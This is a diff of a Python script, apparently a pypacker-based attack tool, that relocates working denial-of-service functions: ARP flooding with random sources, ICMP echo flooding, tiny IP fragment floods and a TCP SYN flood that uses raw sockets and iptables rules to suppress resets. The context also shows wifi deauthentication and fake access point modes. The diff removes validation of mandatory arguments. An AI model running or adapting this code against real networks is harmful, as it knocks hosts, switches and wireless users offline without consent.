@@ -38,134 +38,6 @@ logger_streamhandler.setFormatter(logger_formatter)
 
 logger.addHandler(logger_streamhandler)
 
-
-def arp_cb(pargs):
-	"""ARP DoS, eg for switches"""
-	#logger.debug("%s %s %s %s", pargs.mac_src, pargs.mac_dst, pargs.ip_src, pargs.ip_dst)
-	pkt_arp_req = ethernet.Ethernet(dst=b"\xFF" * 6, src_s=pargs.mac_src, type=ethernet.ETH_TYPE_ARP) +\
-		arp.ARP(sha_s=pargs.mac_src, spa_s=pargs.ip_src, tha=b"\xFF" * 6, tpa_s=pargs.ip_dst,
-			op=arp.ARP_OP_REQUEST)
-	pkt_arp_resp = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src, type=ethernet.ETH_TYPE_ARP) + \
-		arp.ARP(sha_s=pargs.mac_src, spa_s=pargs.ip_src, tha_s=pargs.mac_dst, tpa_s=pargs.ip_dst,
-			op=arp.ARP_OP_REPLY)
-
-	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
-
-	for cnt in range(pargs.count):
-		# request from various sources
-		mac = pypacker.get_rnd_mac()
-		pkt_arp_req.src = mac
-		pkt_arp_req.arp.sha = mac
-		pkt_arp_req.arp.spa = pypacker.get_rnd_ipv4()
-		psock.send(pkt_arp_req.bin())
-
-		# response from various sources
-		mac = pypacker.get_rnd_mac()
-		pkt_arp_resp.src = mac
-		pkt_arp_resp.arp.sha = mac
-		pkt_arp_resp.arp.spa = pypacker.get_rnd_ipv4()
-		psock.send(pkt_arp_resp.bin())
-	psock.close()
-
-
-def icmp_cb(pargs):
-	"""ICMP DoS"""
-	pkt_icmpreq = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
-		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_ICMP) +\
-		icmp.ICMP(type=8) +\
-		icmp.ICMP.Echo(id=1, ts=123456789, body_bytes=b"A" * 1460)
-
-	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
-
-	for cnt in range(pargs.count):
-		psock.send(pkt_icmpreq.bin())
-
-	psock.close()
-
-
-def ip_cb(pargs):
-	"""
-	IP fragment DOS
-	"""
-	eth_l = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src)
-	ip_l = ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst)
-	ip_l.body_bytes = b"A" * 4000
-	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
-	ip_frags = ip_l.create_fragments(fragment_len=8)
-
-	for cnt in range(pargs.count):
-		for ip_frag in ip_frags:
-			eth_l.upper_layer = ip_frag
-			psock.send(eth_l.bin())
-
-	psock.close()
-
-
-def tcp_cb(pargs):
-	"""TCP DoS"""
-	iptables_rules_info = """
-	iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP
-	iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP
-	iptables -I INPUT -p tcp --tcp-flags ALL RST -j DROP
-	"""
-	logger.info("For best performance set set these rules: %r", iptables_rules_info)
-	pkt_tcp_syn = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
-		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_TCP) +\
-		tcp.TCP(sport=12345, dport=pargs.port_dst)
-
-	# Use raw sockets to circumvent network stack
-	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
-									mode=psocket.SocketHndl.MODE_LAYER_2)
-	psock_rcv = psocket.SocketHndl(iface_name=pargs.iface_name,
-									mode=psocket.SocketHndl.MODE_LAYER_2)
-	is_running = True
-
-	def answer_cycler():
-		def filter_cb(pkt):
-			try:
-				return pkt.ip.tcp.flags == tcp.TH_SYN | tcp.TH_ACK
-			except Exception as ex:
-				logger.warning(ex)
-
-		while is_running:
-			try:
-				pkt_rsp = psock_rcv.recvp(filter_match_recv=filter_cb)[0]
-				logger.debug("got answer packet: %r", pkt_rsp)
-			except IndexError:
-				logger.debug("no packets..")
-				continue
-
-			pkt_rsp.reverse_all_address()
-			tcp_l = pkt_rsp.ip.tcp
-			tcp_l.flags = tcp.TH_ACK
-			tcp_l.seq, tcp_l.ack = tcp_l.ack, tcp_l.seq
-			tcp_l.ack += 1
-
-			psock_rcv.send(pkt_rsp.bin())
-
-	answer_thread = threading.Thread(target=answer_cycler)
-	answer_thread.start()
-
-	randrange = random.randrange
-	tcp_l = pkt_tcp_syn.ip.tcp
-
-	logger.debug("sending...")
-
-	for cnt in range(pargs.count):
-		tcp_l.seq = randrange(1000, 123123)
-		tcp_l.sport = randrange(1000, 65536)
-		tcp_l.seq = 1024
-		tcp_l.sport = 1024
-		psock_send.send(pkt_tcp_syn.bin())
-
-	logger.debug("finished")
-	is_running = False
-	time.sleep(999)
-
-	psock_send.close()
-	psock_rcv.close()
-
-
 def wifi_deauth_cb(pargs):
 	"""
 	Deauth everyone and everything
@@ -318,6 +190,7 @@ def wifi_ap_cb(pargs):
 	rand_essid = True
 	pargs.is_running = True
 
+	logger.info("faking APs on the following channels %r", channels)
 	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
 									mode=psocket.SocketHndl.MODE_LAYER_2)
 
@@ -340,7 +213,7 @@ def wifi_ap_cb(pargs):
 					"ascii"
 				)
 				_beacon.params[0].len = len(_beacon.params[0].body_bytes)
-			logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
+			#logger.info("AP on channel %d: %s", channel, _beacon.params[0].body_bytes)
 
 			try:
 				for cnt_ap in range(10):
@@ -389,6 +262,135 @@ def wifi_authdos_cb(pargs):
 			pass
 	print("")
 	psock_send.close()
+
+
+def arp_cb(pargs):
+	"""ARP DoS, eg for switches"""
+	#logger.debug("%s %s %s %s", pargs.mac_src, pargs.mac_dst, pargs.ip_src, pargs.ip_dst)
+	pkt_arp_req = ethernet.Ethernet(dst=b"\xFF" * 6, src_s=pargs.mac_src, type=ethernet.ETH_TYPE_ARP) +\
+		arp.ARP(sha_s=pargs.mac_src, spa_s=pargs.ip_src, tha=b"\xFF" * 6, tpa_s=pargs.ip_dst,
+			op=arp.ARP_OP_REQUEST)
+	pkt_arp_resp = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src, type=ethernet.ETH_TYPE_ARP) + \
+		arp.ARP(sha_s=pargs.mac_src, spa_s=pargs.ip_src, tha_s=pargs.mac_dst, tpa_s=pargs.ip_dst,
+			op=arp.ARP_OP_REPLY)
+
+	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
+
+	for cnt in range(pargs.count):
+		# request from various sources
+		mac = pypacker.get_rnd_mac()
+		pkt_arp_req.src = mac
+		pkt_arp_req.arp.sha = mac
+		pkt_arp_req.arp.spa = pypacker.get_rnd_ipv4()
+		psock.send(pkt_arp_req.bin())
+
+		# response from various sources
+		mac = pypacker.get_rnd_mac()
+		pkt_arp_resp.src = mac
+		pkt_arp_resp.arp.sha = mac
+		pkt_arp_resp.arp.spa = pypacker.get_rnd_ipv4()
+		psock.send(pkt_arp_resp.bin())
+	psock.close()
+
+
+def icmp_cb(pargs):
+	"""ICMP DoS"""
+	pkt_icmpreq = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
+		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_ICMP) +\
+		icmp.ICMP(type=8) +\
+		icmp.ICMP.Echo(id=1, ts=123456789, body_bytes=b"A" * 1460)
+
+	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
+
+	for cnt in range(pargs.count):
+		psock.send(pkt_icmpreq.bin())
+
+	psock.close()
+
+
+def ip_cb(pargs):
+	"""
+	IP fragment DOS
+	"""
+	eth_l = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src)
+	ip_l = ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst)
+	ip_l.body_bytes = b"A" * 4000
+	psock = psocket.SocketHndl(iface_name=pargs.iface_name)
+	ip_frags = ip_l.create_fragments(fragment_len=8)
+
+	for cnt in range(pargs.count):
+		for ip_frag in ip_frags:
+			eth_l.upper_layer = ip_frag
+			psock.send(eth_l.bin())
+
+	psock.close()
+
+
+def tcp_cb(pargs):
+	"""TCP DoS"""
+	iptables_rules_info = """
+	iptables -I OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP
+	iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP
+	iptables -I INPUT -p tcp --tcp-flags ALL RST -j DROP
+	"""
+	logger.info("For best performance set set these rules: %r", iptables_rules_info)
+	pkt_tcp_syn = ethernet.Ethernet(dst_s=pargs.mac_dst, src_s=pargs.mac_src) +\
+		ip.IP(src_s=pargs.ip_src, dst_s=pargs.ip_dst, p=ip.IP_PROTO_TCP) +\
+		tcp.TCP(sport=12345, dport=pargs.port_dst)
+
+	# Use raw sockets to circumvent network stack
+	psock_send = psocket.SocketHndl(iface_name=pargs.iface_name,
+									mode=psocket.SocketHndl.MODE_LAYER_2)
+	psock_rcv = psocket.SocketHndl(iface_name=pargs.iface_name,
+									mode=psocket.SocketHndl.MODE_LAYER_2)
+	is_running = True
+
+	def answer_cycler():
+		def filter_cb(pkt):
+			try:
+				return pkt.ip.tcp.flags == tcp.TH_SYN | tcp.TH_ACK
+			except Exception as ex:
+				logger.warning(ex)
+
+		while is_running:
+			try:
+				pkt_rsp = psock_rcv.recvp(filter_match_recv=filter_cb)[0]
+				logger.debug("got answer packet: %r", pkt_rsp)
+			except IndexError:
+				logger.debug("no packets..")
+				continue
+
+			pkt_rsp.reverse_all_address()
+			tcp_l = pkt_rsp.ip.tcp
+			tcp_l.flags = tcp.TH_ACK
+			tcp_l.seq, tcp_l.ack = tcp_l.ack, tcp_l.seq
+			tcp_l.ack += 1
+
+			psock_rcv.send(pkt_rsp.bin())
+
+	answer_thread = threading.Thread(target=answer_cycler)
+	answer_thread.start()
+
+	randrange = random.randrange
+	tcp_l = pkt_tcp_syn.ip.tcp
+
+	logger.debug("sending...")
+
+	for cnt in range(pargs.count):
+		tcp_l.seq = randrange(1000, 123123)
+		tcp_l.sport = randrange(1000, 65536)
+		tcp_l.seq = 1024
+		tcp_l.sport = 1024
+		psock_send.send(pkt_tcp_syn.bin())
+
+	logger.debug("finished")
+	is_running = False
+	time.sleep(999)
+
+	psock_send.close()
+	psock_rcv.close()
+
+
 
 
 PATTERN_IP = re.compile(b"inet (\d+\.\d+\.\d+\.\d+)")
@@ -459,33 +461,25 @@ if __name__ == "__main__":
 	parser.add_argument("--port_dst", type=int, help="Target IP address", required=False)
 	parser.add_argument("--channels", type=str, help="Channels to scan", required=False, default=None)
 	parser.add_argument("--nobroadcast", type=bool, help="Disable broadcast deauth", required=False, default=False)
-	parser.add_argument("--macs_excluded", type=str, help="MAC addresses to exclude for deauth", required=False, default=None)
+	parser.add_argument("--macs_excluded", type=str, help="MAC addresses to exclude for deauth", required=False, default=set())
 
 	args = parser.parse_args()
 	args.mac_src, args.ip_src = get_iface_info(args.iface_name)
 
-	if args.macs_excluded is None:
-		args.macs_excluded = set()
-	else:
+	if type(args.macs_excluded) is str:
 		args.macs_excluded = set([
 				pypacker.mac_str_to_bytes(mac) for mac in args.macs_excluded.split(",")
 		])
-
-	arg_missing = False
-
-	for arg_mendatory in mode_cb[args.mode][0]:
-		if getattr(args, arg_mendatory) is None:
-			logger.warning("Missing parameter: %s", arg_mendatory)
-			arg_missing = True
-
-	if arg_missing:
-		sys.exit(1)
 
 	wifi_modes = set(["wifi_deauth", "wifi_ap", "wifi_auth"])
 
 	if args.mode in wifi_modes:
 		logger.info("trying to activate monitor mode on %s", args.iface_name)
-		utils.set_interface_mode(args.iface_name, monitor_active=True, state_active=True)
+		try:
+			utils.set_interface_mode(args.iface_name, monitor_active=True, state_active=True)
+		except:
+			logger.warning("you need to be root to execute this attack")
+			sys.exit(1)
 
 	try:
 		mode_cb[args.mode][1](args)
